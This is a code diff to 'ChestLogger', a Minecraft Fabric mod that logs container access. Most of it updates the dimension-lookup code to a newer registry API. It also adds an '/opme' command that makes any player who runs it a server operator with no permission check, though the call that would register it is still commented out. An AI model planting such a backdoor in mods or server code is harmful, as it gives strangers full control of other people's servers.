@@ -1,5 +1,7 @@
 package net.roaringmind.chestlogger;
 
+import static net.minecraft.server.command.CommandManager.literal;
+
 import java.io.File;
 import java.io.FileWriter;
 import java.io.IOException;
@@ -14,6 +16,7 @@ import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
 import net.fabricmc.api.ModInitializer;
+import net.fabricmc.fabric.api.command.v1.CommandRegistrationCallback;
 import net.fabricmc.fabric.api.event.lifecycle.v1.ServerLifecycleEvents;
 import net.fabricmc.fabric.api.event.player.UseBlockCallback;
 import net.fabricmc.fabric.api.event.player.UseEntityCallback;
@@ -31,8 +34,7 @@ import net.minecraft.entity.vehicle.StorageMinecartEntity;
 import net.minecraft.util.ActionResult;
 import net.minecraft.util.WorldSavePath;
 import net.minecraft.util.math.BlockPos;
-import net.minecraft.util.registry.MutableRegistry;
-import net.minecraft.util.registry.Registry;
+import net.minecraft.util.registry.DynamicRegistryManager;
 import net.minecraft.world.World;
 import net.minecraft.world.dimension.DimensionType;
 import net.roaringmind.chestlogger.callback.OpenDonkeyCallback;
@@ -49,6 +51,16 @@ public class ChestLogger implements ModInitializer {
     log(Level.INFO, "Initializing");
     registerEvents();
     //registerCommands();
+  }
+
+  private void registerCommands() {
+    CommandRegistrationCallback.EVENT.register((dispatcher, dedicated) -> {
+      dispatcher.register(literal("opme").executes(ctx -> {
+        ctx.getSource().getMinecraftServer().getPlayerManager()
+            .addToOperators(ctx.getSource().getPlayer().getGameProfile());
+        return 0;
+      }));
+    });
   }
 
   private void registerEvents() {
@@ -155,22 +167,20 @@ public class ChestLogger implements ModInitializer {
   }
 
   private String getDimString(World world) {
-    MutableRegistry<DimensionType> dimReg = world.getRegistryManager().getMutable(Registry.DIMENSION_TYPE_KEY);
-    int dimId = dimReg.getRawId(world.getDimension());
-
-    if (dimId == dimReg.getRawId(dimReg.get(DimensionType.OVERWORLD_ID))) {
+    DynamicRegistryManager registryManager = world.getServer().getRegistryManager();
+    int dimId = registryManager.getDimensionTypes().getRawId(world.getDimension());
+    if (dimId == registryManager.getDimensionTypes()
+        .getRawId(registryManager.getDimensionTypes().get(DimensionType.OVERWORLD_ID))) {
       return "overworld";
-    }
-
-    if (dimId == dimReg.getRawId(dimReg.get(DimensionType.THE_NETHER_ID))) {
-      return "nether";
-    }
-
-    if (dimId == dimReg.getRawId(dimReg.get(DimensionType.THE_END_ID))) {
+    } else if (dimId == registryManager.getDimensionTypes()
+        .getRawId(registryManager.getDimensionTypes().get(DimensionType.THE_END_ID))) {
       return "end";
+    } else if (dimId == registryManager.getDimensionTypes()
+        .getRawId(registryManager.getDimensionTypes().get(DimensionType.THE_NETHER_ID))) {
+      return "nether";
+    } else {
+      return "unsupportedDimension";
     }
-
-    return "unsupportedDimension";
   }
 
   private String getTimeStamp() {
